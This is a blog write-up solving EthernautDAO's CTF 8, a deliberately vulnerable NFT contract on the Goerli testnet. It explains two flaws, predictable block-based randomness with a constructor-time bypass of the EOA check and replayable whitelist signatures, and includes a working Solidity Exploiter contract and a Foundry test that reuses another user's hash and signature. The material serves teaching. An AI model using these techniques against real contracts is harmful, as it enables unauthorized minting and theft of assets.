---
title: 'EthernautDAO CTF 8 — Vulnerable NFT'
excerpt: ΞthernautDAO is common goods DAO aimed at transforming developers into Ethereum developers. </br></br>In this challenge we need to exploit an ERC721 token called VNFT (Vulnerable NFT). The goal of the challenge is to be able to mint an NFT via `whitelistMint` or via `imFeelingLucky`. .
coverImage:
  url: '/assets/blog/ethernautdao.jpeg'
  credit:
    name: ΞthernautDAO
    url: https://twitter.com/EthernautDAO
date: '2022-09-27T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernautdao.jpeg'
---

[ΞthernautDAO](https://twitter.com/EthernautDAO) is common goods DAO aimed at transforming developers into Ethereum developers.

They started releasing CTF challenges on Twitter, so how couldn't I start solving them?

[https://twitter.com/EthernautDAO/status/1561352425394515968](https://twitter.com/EthernautDAO/status/1561352425394515968)

## CTF 8: Vulnerable NFT

In this challenge, we need to exploit an ERC721 token called [VNFT](https://goerli.etherscan.io/address/0xc357c220d9ffe0c23282fcc300627f14d9b6314c#code) (Vulnerable NFT). The goal of the challenge is to be able to mint an NFT via `whitelistMint` or via `imFeelingLucky`.

## Study the contracts

As we said in the introduction, there are two possible way to mint a NFT token by interacting with the contract, we will explore and exploit both ways.

### Exploit `imFeelingLucky` function

Let's review the function's code

```solidity
function imFeelingLucky(
    address to,
    uint256 qty,
    uint256 number
) external {
    require(qty > 0 && qty <= MAX_TX, "Invalid quantity");
    require(totalSupply + qty <= MAX_SUPPLY, "Max supply reached");
    require(mintsPerWallet[to] + qty <= MAX_WALLET, "Max balance per wallet reached");
    require((msg.sender).code.length == 0, "Only EOA allowed"); // aggirabile tramite minting da contract

    uint256 randomNumber = uint256(
        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, totalSupply))
    ) % 100; // calc it before calling it if it's a block we like

    require(randomNumber == number, "Better luck next time!");

    unchecked {
        mintsPerWallet[to] += qty;
        uint256 mintId = totalSupply;
        totalSupply += qty;
        for (uint256 i = 0; i < qty; i++) {
            _safeMint(to, mintId++);
        }
    }
}
```

Let's see what it does line by line

- Check if number of NFT to be minted (`qty`) is less than the max number of mintable NFT per tx (`MAX_TN` defined as a contract's `constant` value)
- Check if the number of NFT to be minted plus the `totalSupply` is less than or equal to the max number of mintable NFT (`MAX_SUPPLY` defined as a contract's `constant` value)
- Check if the receiver account `to` has already reached the max number of mintable NFT (`MAX_WALLET` defined as a contract's `constant` value). Note that this `mintsPerWallet[to]` is only the number of NFT received by `to` during the minting process, if you look it's never updated in `transfer`/`transferFrom` functions.
- Check that `msg.sender` is not a contract by looking at `(msg.sender).code.length == 0`. The function requires that the `msg.sender` is an EOA.

After all the preliminary checks, it defines a variable called `randomNumber` as follows

```solidity
uint256 randomNumber = uint256(
        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, totalSupply))
    ) % 100;
```

and check that the `number` provided by the sender as an input parameter for the function is equal to `randomNumber`.

If all the checks pass, the contracts mints `qty` NFTs to the `to` receiver account.

We can already identify two problems

- The usage of a pseudo-random number as if it were a real random number that the user could not guess before interacting with the contract
- The check done to prevent contracts to mint NFTs

An important concept that I always iterate during this kind of exploit is that you **always** need to remember that there is no real "native" randomness in the blockchain, but only "**pseudo randomness**".
When you look at the code, and you see a variable called `randomNumber` you can immediately start thinking about a way to find the correct values to recreate what the smart contract is expecting to receive.

The easier way to exploit that check? Just generate the random number from the contract that is going to call `imFeelingLucky` and pass it as an input parameter.

> **Note:** Well, there is a new **OPCODE** called **RANDOM** that has replaced **DIFFICULTY** after **The Merge** but as far as I get reading the EIP and the comments it's still far away from a **real and true** source of randomness. Another problem to take in consideration is also the fact that it would return the same value during the same block. If you want to read more about the new RANDOM opcode take a look at [EIP-4399: Supplant DIFFICULTY opcode with RANDOM](https://ethereum-magicians.org/t/eip-4399-supplant-difficulty-opcode-with-random/7368).

The second check we want to pass is the one done to allow only EOA (Externally Owned Account) and prevent any smart contract to mint token via `imFeelingLucky`.

The function has this specific check `require((msg.sender).code.length == 0, "Only EOA allowed");`

There are two moments when `(contractAddress).code.length` will return **0**:

1. If the contract has been destroyed via `selfdestruct`. As far as I tested, the code will be empty only after the block that contains the transaction with the destruct opcode
2. When the `constructor` of the contract is executed. During this period of time, the `.code` property would return **0** because the **runtime** bytecode of the contract is still zero.

In this case, the exploit would be to call the `imFeelingLucky` function when the EVM is executing the `constructor` code.

### Exploit `whitelistMint` function

This function is even easier to exploit compared to the previous one. The hard part is just to learn and master all the knowledge and concepts that are behind how the signature process work, how and when it should be used and how to structure the contract in a way to prevent this kind of exploits.

Let's review the code and then explain all the concepts needed and see if we can find an exploit to mint an NFT via `whitelistMint`

```solidity
// only whitelisted wallets can mint
function whitelistMint(
    address to,
    uint256 qty,
    bytes32 hash,
    bytes memory signature
) external payable {
    require(recoverSigner(hash, signature) == owner(), "Address is not allowlisted");
    require(totalSupply + qty <= MAX_SUPPLY, "Max supply reached");
    require(mintsPerWallet[to] + qty <= MAX_WALLET, "Max balance per wallet reached");

    unchecked {
        mintsPerWallet[to] += qty;
        uint256 mintId = totalSupply;
        totalSupply += qty;
        for (uint256 i = 0; i < qty; i++) {
            _safeMint(to, mintId++);
        }
    }
}

function recoverSigner(bytes32 hash, bytes memory signature) public pure returns (address) {
    bytes32 messageDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    return ECDSA.recover(messageDigest, signature);
}
```

The main difference compared to `imFeelingLucky` is that this function do not check whether the caller is an EOA or a contract, and also do not have the `MAX_TX` check. Probably it's not even needed because you still have the check for `MAX_WALLET` and in this specific case both `MAX_TX` and `MAX_WALLET` would allow to mint **two** NFTs at max.

The function also is not checking that `qty` is greater than zero. It should not be a security problem because no token is minted, and no event is emitted, but still, the user would waste gas for nothing.

The check that contains the exploit is this one:

`require(recoverSigner(hash, signature) == owner(), "Address is not allowlisted");`

Maybe the correct thing to say is that the **exploit is possible because of the code that is missing**! The current check verify that the `signer` that has signed the `hash` message with the `signature` is the `owner` of the contract. What does it mean if the `signer` and the `owner` match? That the owner itself have signed a message with their private key and have provided you all the information needed to prove that only him/her could have done that.

If you look at the [OpenZeppelin documentation](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA-recover-bytes32-uint8-bytes32-bytes32-) for `ECDSA.recover` contained in `recoverSigner` you see this information

> `recover(bytes32 hash, bytes signature) → address`
>
> Returns the address that signed a hashed message (`hash`) with `signature`. This address can then be used for verification purposes.
>
> The `ecrecover` EVM opcode allows for malleable (non-unique) signatures: this function rejects them by requiring the `s` value to be in the lower half order, and the `v` value to be either 27 or 28.
>
> **Important note:** `hash` *must* be the result of a hash operation for the verification to be secure: it is possible to craft signatures that recover to arbitrary addresses for non-hashed data. A safe way to ensure this is by receiving a hash of the original message (which may otherwise be too long), and then calling [`toEthSignedMessageHash`](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA-toEthSignedMessageHash-bytes-) on it.

Do you see where the problem is? Both `hash` and `signature` are not sensible information per se because they do not reveal the `signer` private key, but they are still unique information that should be treated so. Anyone who owns those two values can prove that they got whitelisted by the owner itself.
There are ways to make the hashed message contains information on the whitelisted user, like for example using the [EIP-721](https://eips.ethereum.org/EIPS/eip-712), but these are concepts for another moment.

What is missing right now is the part of the code that "burn" the signature used to mint the token and prevent someone else to re-use the same `hash` and `signature` to mint other tokens.

If we look at [one of the transactions](https://goerli.etherscan.io/tx/0x77b3f89a955bd272221d7acb84600b6f9a1cdab47bdc6d3bb13fd6bc0877b6bf) used by someone whitelisted to mint tokens, we can just see the `hash` and `signature` passed as parameters and re-use them for ourselves!

## Solution code

Now what we have to do is:

- Create an Alchemy or Infura account to be able to fork the Goerli blockchain
- Choose a good block from which we can create a fork. Any block after the creation of the contract will be good
- Run a foundry test that will use the fork to execute the test

Here's the code that I used for the test:

```solidity
contract Exploiter {
    constructor(VNFT level) {
        // randomNumber requested by the smart contract to be able to mint an NFT via `imFeelingLucky`
        uint256 randomNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, level.totalSupply()))
        ) % 100;

        // That's it, now we just need to call the contract with the same number it was expecting to see
        level.imFeelingLucky(msg.sender, 1, randomNumber);
    }
}
```

```solidity
function testCompleteLevel() public {
    address player = users[0];
    vm.startPrank(player);

    // assert that we do not own any VNFT
    assertEq(level.balanceOf(player), 0);

    ////////////////////////////////////////////
    // Exploiting whitelistMint function
    ////////////////////////////////////////////

    bytes32 originalHash = bytes32(0xd54b100c13f0d0e7860323e08f5eeb1eac1eeeae8bf637506280f00acd457f54);
    bytes
        memory originalSignature = hex"f80b662a501d9843c0459883582f6bb8015785da6e589643c2e53691e7fd060c24f14ad798bfb8882e5109e2756b8443963af0848951cffbd1a0ba54a2034a951c";

    level.whitelistMint(player, 1, originalHash, originalSignature);
    assertEq(level.balanceOf(player), 1);

    ////////////////////////////////////////////
    // Exploiting imFeelingLucky function
    ////////////////////////////////////////////

    // Create a new Exploiter contract and run the exploit inside their `constructor`
    new Exploiter(level);

    // Assert we have
    assertEq(level.balanceOf(player), 2);

    vm.stopPrank();
}
```

Here is the command I have used to run the test: `forge test --match-contract VNFTTest --fork-url <your_rpc_url> --fork-block-number 7439187 -vv`

Just remember to replace `<your_rpc_url>` with the RPC URL you got from Alchemy or Infura.

You can read the full solution of the challenge, opening [VNFT.t.sol](https://github.com/StErMi/ethernautdao-ctf/blob/main/test/VNFT.t.sol)

## Further reading

- [SWC-120: Weak Sources of Randomness from Chain Attributes](https://swcregistry.io/docs/SWC-120)
- [SWC-136: Unencrypted Private Data On-Chain](https://swcregistry.io/docs/SWC-136)
- [EIP-4399: Supplant DIFFICULTY opcode with RANDOM](https://ethereum-magicians.org/t/eip-4399-supplant-difficulty-opcode-with-random/7368)
- [Chainlink VRF (Verifiable Random Function)](https://docs.chain.link/docs/chainlink-vrf/)
- [OpenZeppelin Address.isContract important notes](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-isContract-address-)
- [ECDSA lib from OpenZeppelin](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA-recover-bytes32-bytes-)
- [EIP-191: Signed Data Standard](https://eips.ethereum.org/EIPS/eip-191)
- [EIP-712: Typed structured data hashing and signing](https://eips.ethereum.org/EIPS/eip-712)

## Disclaimer

All Solidity code, practices, and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
